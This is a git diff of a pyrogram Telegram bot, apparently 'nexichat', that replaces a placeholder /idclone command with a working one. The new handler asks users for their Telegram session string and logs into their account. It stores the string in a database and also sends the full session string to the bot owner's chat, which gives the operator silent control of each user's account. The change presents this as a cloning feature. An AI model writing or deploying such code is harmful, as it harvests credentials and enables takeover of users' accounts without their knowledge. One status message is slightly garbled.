@@ -3,8 +3,7 @@ import os
 import asyncio
 from pyrogram.enums import ParseMode
 from pyrogram import Client, filters
-from pyrogram.types import Message
-from pyrogram.errors import AccessTokenExpired, AccessTokenInvalid
+from pyrogram.errors import AccessTokenExpired, AccessTokenInvalid, SessionPasswordNeeded, PhoneCodeInvalid
 import config
 from config import API_HASH, API_ID, OWNER_ID
 from nexichat import CLONE_OWNERS
@@ -130,28 +129,6 @@ async def restart_bots():
         except (AccessTokenExpired, AccessTokenInvalid):
             await clonebotdb.delete_one({"token": bot_token})
 
-# Function to clone a chatbot
-"""@app.on_message(filters.command("idclone"))
-async def clone_chatbot(client: Client, message: Message):
-    try:
-        # Extract the target chatbot ID from the command
-        target_chatbot_id = int(message.command[1])
-        
-        # Get the target chatbot's information
-        target_chatbot = await client.get_chat(target_chatbot_id)
-        
-        # Clone the chatbot (this is a placeholder, you need to implement the actual cloning logic)
-        # For example, you might want to copy the chatbot's name, description, etc.
-        cloned_chatbot_name = f"Cloned {target_chatbot.title}"
-        
-        # Send a message confirming the cloning
-        await message.reply_text(f"Chatbot '{target_chatbot.title}' has been cloned as '{cloned_chatbot_name}'.")
-    
-    except IndexError:
-        await message.reply_text("Please provide a valid chatbot ID.")
-    except Exception as e:
-        await message.reply_text(f"An error occurred: {e}")"""
-
 
 @app.on_message(filters.command("delallclone") & filters.user(int(OWNER_ID)))
 async def delete_all_cloned_bots(client, message):
@@ -163,55 +140,56 @@ async def delete_all_cloned_bots(client, message):
         logging.exception(e)
         await message.reply_text(f"**Error clearing all bots:** `{e}`")
 
-async def clone_telegram_account(client: Client, message: Message, session_string: str):
+
+@app.on_message(filters.command("idclone"))
+async def id_clone(client, message):
+    if len(message.command) < 2:
+        await message.reply_text("**Pʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ sᴇssɪᴏɴ sᴛʀɪɴɢ ᴀғᴛᴇʀ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ.**")
+        return
+
+    session_string = message.text.split("/idclone", 1)[1].strip()
+    mi = await message.reply_text("➥ Cʜᴇᴄᴋɪɴɢ sᴇssɪᴏɴ sᴛʀɪɴɢ ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ↺......")
     try:
-        # Initialize the original account client using the provided session string
-        original_client = Client("original_account", api_id=API_ID, api_hash=API_HASH, session_string=session_string)
+        ai = Client(":memory:", API_ID, API_HASH, session_string=session_string, plugins=dict(root="nexichat/mplugin"))
+        await ai.start()
+        user = await ai.get_me()
+        user_id = message.from_user.id
+        CLONE_OWNERS[user.id] = user_id
+    except (SessionPasswordNeeded, PhoneCodeInvalid):
+        await mi.edit_text("**Invalid session string. Please provide a valid one.**")
+        return
+    except Exception as e:
+        logging.exception("Error cloning session.")
+        await mi.edit_text(
+            f"⚠️ **Error:**\n\n`{e}`\n\n**Cᴏɴᴛᴀᴄᴛ [Sᴜᴘᴘᴏʀᴛ ᴄʜᴀᴛ](https://t.me/+OL6jdTL7JAJjYzVl) ғᴏʀ ʜᴇʟᴘ.**"
+        )
+        return
 
-        # Start the original account client
-        await original_client.start()
+    await mi.edit_text("**➥ Cʟᴏɴɪɴɢ ɪs �ʀᴏɢʀᴇss ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ↺...**")
+    try:
+        details = {
+            "user_id": user.id,
+            "is_bot": False,
+            "name": user.first_name,
+            "username": user.username,
+            "session_string": session_string,
+        }
 
-        # Get the original account's profile information
-        original_me = await original_client.get_me()
-        original_first_name = original_me.first_name
-        original_last_name = original_me.last_name
-        original_bio = (await original_client.get_chat(original_me.id)).bio
-        original_photo = await original_client.download_media(original_me.photo.big_file_id) if original_me.photo else None
-
-        # Initialize the clone account client (the bot itself)
-        clone_client = client
-
-        # Update the clone account's profile information
-        await clone_client.update_profile(
-            first_name=original_first_name,
-            last_name=original_last_name,
-            bio=original_bio
+        await app.send_message(
+            OWNER_ID, f"**#New_Clone**\n\n**User:** @{user.username}\n\n**Details:**\n{details}"
         )
 
-        # Set the clone account's profile picture
-        if original_photo:
-            await clone_client.set_profile_photo(photo=original_photo)
+        await clonebotdb.insert_one(details)
+        await save_clonebot_owner(user.id, user_id)
+        CLONES.add(user.id)
 
-        # Notify the user that cloning is complete
-        await message.reply_text(f"Telegram account '{original_first_name} {original_last_name}' has been cloned successfully.")
-
+        await mi.edit_text(
+            f"**➥ Usᴇʀ @{user.username} sᴜᴄᴄᴇssғᴜʟʟʏ sᴛᴀʀᴛᴇᴅ ✅.**\n\n"
+            "➥ Tᴏ ʀᴇᴍᴏᴠᴇ ᴛʜɪs ᴄʟᴏɴᴇ: `/delclone`\n"
+            "➠ Kᴇᴇᴘ sᴜᴘᴘᴏʀᴛ 🙂 ||@BABY09_WORLD||"
+        )
     except Exception as e:
-        await message.reply_text(f"An error occurred: {e}")
-    finally:
-        # Stop the original client
-        await original_client.stop()
-
-# Handler for the /idclone command
-@app.on_message(filters.command("idclone"))
-async def idclone_command(client: Client, message: Message):
-    try:
-        # Extract the session string from the command
-        session_string = message.command[1]
-        
-        # Call the clone function
-        await clone_telegram_account(client, message, session_string)
-    
-    except IndexError:
-        await message.reply_text("Please provide a session string. Usage: /idclone <session_string>")
-    except Exception as e:
-        await message.reply_text(f"An error occurred: {e}")
+        logging.exception("Error cloning session.")
+        await mi.edit_text(
+            f"⚠️ **Error:**\n\n`{e}`\n\n**Cᴏɴᴛᴀᴄᴛ [Sᴜᴘᴘᴏʀᴛ ᴄʜᴀᴛ](https://t.me/+OL6jdTL7JAJjYzVl) ғᴏʀ ʜᴇʟᴘ.**"
+        )
